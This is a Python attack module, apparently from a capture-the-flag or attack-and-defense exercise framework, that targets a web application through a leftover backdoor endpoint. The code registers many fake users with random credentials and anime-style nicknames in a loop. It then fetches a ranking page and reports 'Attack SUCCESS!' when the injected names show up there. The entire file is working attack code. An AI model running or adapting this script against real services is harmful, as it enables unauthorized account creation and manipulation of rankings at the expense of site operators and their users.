#!/usr/bin/env python
# coding: UTF-8
import requests
import json
import sys
import re
import hashlib
import random
from os import urandom

class AtkBackdoorCreateCheatUser(object):
    def __init__(self, utility, host="127.0.0.1", port="80" ,debug=False):
        self.utility = utility
        self.host = host
        self.port = port
        self.ua = utility.ua
        self.debug = debug
        self.description = "The module can be create cheat users if a backdoor is not delete yet."
        self.target = host + ":" + port

    def __str__(self):
        return 'AtkBackdoorCreateCheatUser object (target: %s, description: %s)' % (self.target, self.description)

    __repr__ = __str__


    def sendattack(self, target_path, num):
        #proxy
        #proxies = {"http": "http://127.0.0.1:8080","https": "http://127.0.0.1:8080"}
        proxies = {"http": None,"https": None}
        
        # connect timeout, read timeout
        timeoutvalue= (5.0, 5.5)

        target_url = "http://" + self.target + target_path

        # nickname list
        namelist = ["Amuro","Char","Levi","Ellen","Conan","Naruto","Kenshin","Luffy","Goku","Jyotaro","Dio","Tanjiro","Itadori","Saber","Archer","Shiro","Kamijyo","Allen","Shinji","Sakuragi","Subaru","Edward","Accelerator","Ranma","Araragi","Gon","Killua","Tatuya","Kirito","Asuna","Kaneki","Lelouch","Mari","Rei","Asuka","Pazu","Sheeta","Musuka","Megumin","Kazuma","Misato","Shana","Tumugi","Ritu","Azusa","Yui","Homura","Madoka","Eru","Nausicaa","Mikoto","Haruhi","Lem"]
        injectuserid = []

        try:
            self.logger("Attack Start", "+")

            session = requests.Session()

            for i in range(num):
                set_id = hashlib.sha256(urandom(10)).hexdigest()
                set_password = urandom(10).hex()
                nickname_token = hashlib.md5(urandom(10)).hexdigest()[:10]
                set_nickname = random.choice(namelist) + "_" + nickname_token
                injectuserid.append(set_nickname)
                
                json_data = { "user_name": set_id, "password": set_password, "nick_name": set_nickname}
                headers = { "Content-Type": "application/json", "User-Agent": self.ua }
                response1 = session.post(target_url, data=json.dumps(json_data), headers=headers, proxies=proxies, timeout=timeoutvalue)

            self.logger("Attack complete", "+")

            target_url = "http://" + self.target + "/ranking?sort=2"
            response2 = session.get(target_url, proxies=proxies, timeout=timeoutvalue)

            print("-----ranking-----")
            print("Status code:   %i" % response2.status_code)
            print("Response body: %s" % response2.content)

            pattern = "|".join(injectuserid)

            regex = re.compile(r"%s" % pattern)

            if regex.search(response2.text):
                self.logger("Attack SUCCESS!", "+")   
            else:
                self.logger("May be Attack failed?", "!")

        except requests.exceptions.RequestException as e:
            self.logger("Error occurred", "!")
            file=sys.stderr
            print(e)
            #sys.exit(1)


    def logger(self, m="", o="+"):
        message = "[{}] {}".format(o,m)
        print(message)

